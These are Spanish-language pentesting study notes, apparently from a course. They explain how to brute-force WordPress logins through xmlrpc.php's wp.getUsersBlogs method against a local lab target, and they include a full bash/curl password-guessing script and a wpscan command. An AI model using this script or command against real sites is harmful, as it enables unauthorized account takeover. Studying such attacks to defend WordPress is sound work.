
# Indice

- [[#Indice]]
- [[#Introducción]]
- [[#Practica]]
- [[#Siguientes apuntes]]

# Introducción

Se verá la construcción de un script para abusar del recurso __xmlrpc.php__, aplicando fuerza bruta. El objetivo de este ejercicio será demostrar cómo los atacantes pueden utilizar este archivo existente en WordPress para intentar descubrir credenciales válidas y comprometer la seguridad de un sitio web. 

Para lograrlo, el script en bash implementa la herramienta __curl__ para enviar solicitudes XML-RPC al archivo xmlrpc.php del sitio web WordPress. A través del método __wp.getUsersBlogs__, enviaremos una estructura XML que contendrá el nombre de usuario y la contraseña a probar.

En caso de que las credenciales no sean correctas, el servidor responderá con un mensaje de error que indica que las credenciales son incorrectas. Sin embargo, si las credenciales son válidas, la respuesta del servidor será diferente y no incluirá el mensaje de error. 

De tal forma que podremos utilizar la respuesta del servidor para determinar cuándo hemos encontrado las credenciales válidas y, de esta forma, tener acceso al sitio web de WordPress comprometido.

Cabe destacar que el método __wp.getUsersBlogs__ no es el único método existente, ni mucho menos la única vulnerabilidad de xmlrpc.php. Existen otros métodos como __wp.getUsers__, __wp.getAuthors__ o __wp.getComments__, entre otros, que también pueden ser utilizados por atacantes para realizar ataques de fuerza bruta y comprometer la seguridad del sitio web de WordPress. 

Por lo tanto, es importante tener en cuenta que la seguridad de un sitio web de WordPress no solo depende de tener contraseñas seguras y actualizadas, sino también de estar atentos a posibles vulnerabilidades del archivo xmlrpc.php y otras áreas del sitio web.

# Practica

Para este punto se tiene como consideración que ya tienes conocimientos en scripting en Bash. Por ende, solo se proporcionará el script y se explicará a grandes rasgos.

```shell
#!/bin/bash

function ctrl_c(){
  echo -e "\n\n[!] Saliendo...\n"
  exit 1
}

# CTRL + C
trap ctrl_c SIGINT

function enumerate(){
  password=$1

  xmlFile="""<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>sammy</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>"""

  echo "$xmlFile" > file.xml

  result=$(curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file.xml)

  if [ ! "$(echo "$result" | grep "Incorrect username or password.")" ]; then
    echo -e "\n\n[+] La password correcta para sammy es $password\n"
    exit 0
  fi
}

cat /opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt | while read password; do
  enumerate $password
done
```

![[EnumServComunes/Gestores de contenido (CMS)/Wordpress/2-2/images/001.png]]

El archivo lo que hace es leer el diccionario y, contraseña por contraseña, manda a llamar a la función enumerate, que se encarga de enviar la petición POST y, siempre y cuando no se reciba el mensaje de error del servidor, además cambiando la contraseña del contenido para efectuar correctamente el ataque de fuerza bruta. 

Esto mismo es capaz de hacer wpscan, solo que de una forma más eficiente y rápida:

```shell
wpscan --url http://127.0.0.1:31337 -U sammy -P dictionary
```

![[EnumServComunes/Gestores de contenido (CMS)/Wordpress/2-2/images/002.png]]


# Siguientes apuntes

[[Enumeración de gestores de contenido (CMS) – Joomla]]